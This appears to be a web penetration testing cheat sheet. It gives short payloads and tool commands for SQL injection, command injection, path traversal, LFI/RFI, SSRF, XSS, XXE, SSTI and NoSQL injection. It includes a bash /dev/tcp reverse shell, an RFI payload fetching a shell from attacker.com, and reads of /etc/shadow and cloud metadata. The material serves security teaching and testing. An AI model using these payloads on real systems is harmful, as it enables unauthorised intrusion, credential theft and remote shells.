# Web Vulnerabilities

## Content

- Web Enumeration
- HTTP Methods
- Authentication Vulnerabilities
- IDOR
- SQL Injection
- Command Injection
- File Upload
- Path Traversal
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- Server Side Request Forgery (SSRF)
- Cross Site Scripting (XSS)
- Cross Site Request Forgery (CSRF)
- Server Side Template Injection (SSTI)
- XXE
- NoSQL Injection
- API Testing
- Tools
- References

---

# 1. Web Enumeration

Before exploiting, gather information about:

- Web server
- Technologies
- Frameworks
- Endpoints
- Parameters
- Hidden directories

---

## Nmap Web Scan

```bash
nmap -sC -sV -p80,443 <IP>
```

Full scan:

```bash
nmap -p- <IP>
```

Scripts:

```bash
nmap --script http-enum <IP>
```

---

## WhatWeb

Identify technologies:

```bash
whatweb http://target.com
```

Information:

- CMS
- Framework
- Server
- Languages

---

## Directory Enumeration

Gobuster:

```bash
gobuster dir \
-u http://target.com \
-w /usr/share/wordlists/dirb/common.txt
```

Feroxbuster:

```bash
feroxbuster \
-u http://target.com
```

Look for:

```
/admin
/login
/uploads
/config
/backup
```

---

# 2. HTTP Methods

Check allowed methods:

```bash
curl -X OPTIONS http://target.com
```

Common methods:

```
GET
POST
PUT
DELETE
PATCH
OPTIONS
```

Dangerous:

```
PUT
DELETE
TRACE
```

Test:

```bash
curl -X PUT http://target.com/file.txt
```

---

# 3. Authentication Vulnerabilities

Common issues:

- Weak passwords
- Default credentials
- Missing rate limiting
- Password reset flaws
- Session problems


Default credentials examples:

```
admin:admin
admin:password
root:root
```

---

## Brute Force Testing

Hydra:

```bash
hydra \
-l admin \
-P passwords.txt \
http-post-form \
"/login:user=^USER^&pass=^PASS^:Invalid"
```

---

# 4. IDOR (Insecure Direct Object Reference)

Occurs when users can access objects without authorization.

Example:

Normal:

```
/profile?id=100
```

Change:

```
/profile?id=101
```

Test:

- User IDs
- File IDs
- Invoice numbers
- API endpoints

---

# 5. SQL Injection (SQLi)

## Detection

Test:

```
'
"
;
```

Example:

```
?id=1'
```

Errors:

```
SQL syntax error
Database error
```

---

## Basic Payloads

Authentication bypass:

```sql
' OR 1=1-- -
```

Union:

```sql
' UNION SELECT NULL--
```

Database:

```sql
' UNION SELECT database(),user()--
```

---

## SQLMap

Basic:

```bash
sqlmap -u "http://target.com/page?id=1"
```

Database enumeration:

```bash
sqlmap \
-u "URL" \
--dbs
```

Tables:

```bash
sqlmap \
-u "URL" \
-D database \
--tables
```

---

# 6. Command Injection

Allows execution of system commands.


Test:

```
;
&&
||
|
```

Example:

```
127.0.0.1; whoami
```

Useful commands:

Linux:

```bash
id
whoami
uname -a
```

Windows:

```cmd
whoami
hostname
systeminfo
```

---

## Reverse Shell Example

Linux:

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

Listener:

```bash
nc -lvnp PORT
```

---

# 7. File Upload Vulnerabilities

Occurs when applications allow dangerous file uploads.

Test:

- PHP files
- Extensions bypass
- MIME bypass
- Double extensions


Examples:

```
shell.php
shell.php.jpg
shell.phtml
```

Check:

```
/uploads
/files
/media
```

---

# 8. Path Traversal

Allows reading files outside the intended directory.


Test:

```
../
../../
../../../
```

Example:

```
?page=../../../../etc/passwd
```

Sensitive files:

Linux:

```
/etc/passwd
/etc/shadow
```

Windows:

```
C:\Windows\System32\drivers\etc\hosts
```

---

# 9. Local File Inclusion (LFI)

Allows loading local files.

Example:

```
?page=/etc/passwd
```

Common payloads:

```
../../../../etc/passwd
```

Useful files:

Linux:

```
/var/log/apache2/access.log
```

Windows:

```
C:\Windows\win.ini
```

---

# 10. Remote File Inclusion (RFI)

Allows loading remote files.


Example:

```
?page=http://attacker.com/shell.php
```

Requirements:

- allow_url_include enabled
- Vulnerable application

---

# 11. Server Side Request Forgery (SSRF)

Allows server-side requests.

Test:

```
http://127.0.0.1
```

Internal services:

```
localhost
127.0.0.1
169.254.169.254
```

Cloud metadata:

AWS:

```
http://169.254.169.254/latest/meta-data/
```

---

# 12. Cross Site Scripting (XSS)

Allows JavaScript execution.


## Reflected XSS

Payload:

```html
<script>alert(1)</script>
```


## Stored XSS

Payload stored in database:

```html
<img src=x onerror=alert(1)>
```


## DOM XSS

Occurs in client-side JavaScript.


Test:

```
<script>alert(document.cookie)</script>
```

---

# 13. Cross Site Request Forgery (CSRF)

Forces users to execute actions.


Requirements:

- No CSRF token
- Predictable requests
- Authentication active


Example:

```html
<form action="/change-password">
<input name="password" value="Password123">
</form>
```

---

# 14. Server Side Template Injection (SSTI)

Occurs when user input is processed as a template.


Detection:

Jinja2:

```
{{7*7}}
```

Result:

```
49
```

Other engines:

```
${7*7}
<%= 7*7 %>
```

---

# 15. XXE (XML External Entity)

XML parser vulnerability.


Payload:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

Can read:

```
/etc/passwd
config files
internal resources
```

---

# 16. NoSQL Injection

Used against databases like MongoDB.


Example:

Normal:

```json
{
"user":"admin",
"password":"password"
}
```


Payload:

```json
{
"user":{"$ne":null},
"password":{"$ne":null}
}
```

---

# 17. API Testing

Look for:

- Hidden endpoints
- Weak authentication
- Excessive permissions
- Information disclosure


Enumeration:

```bash
ffuf -u http://target.com/FUZZ \
-w wordlist.txt
```


Common endpoints:

```
/api
/api/v1
/swagger
/graphql
```

---

# 18. Useful Tools
## Burp Suite
Used for:

- Proxy interception
- Repeater
- Intruder
- Scanner


## Other Tools

- Nmap
- Gobuster
- Feroxbuster
- FFUF
- SQLMap
- WhatWeb
- Nikto
- Wpscan


---

# Web Pentesting Workflow

```
Recon
 |
Enumeration
 |
Identify Technology
 |
Find Endpoints
 |
Test Parameters
 |
Exploit Vulnerability
 |
Get Shell
 |
Privilege Escalation
 |
Report
```

---

# References

- https://portswigger.net/web-security
- https://owasp.org/www-project-top-ten/
- https://github.com/sqlmapproject/sqlmap
- https://github.com/ffuf/ffuf
